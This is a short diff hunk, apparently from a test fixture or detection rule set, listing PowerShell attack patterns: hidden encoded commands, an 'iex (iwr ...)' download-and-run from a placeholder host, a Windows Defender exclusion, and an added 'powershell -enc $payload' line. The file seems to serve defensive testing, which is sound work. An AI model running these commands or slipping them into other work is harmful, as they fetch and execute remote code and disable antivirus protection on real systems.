@@ -4,3 +4,4 @@ powershell -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAb
 iex (iwr 'https://payload.example.invalid/y.ps1' -UseBasicParsing)
 powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAGYAcgBvAG0AIAB0AGgAZQAgAHMAeQBuAHQAaABlAHQAaQBjACAAZgBpAHgAdAB1AHIAZQA7ACAAbgBvAHQAIAByAHUAbgAnAA==
 Add-MpPreference -ExclusionPath "C:\Fixture\Dir"
+powershell -enc $payload
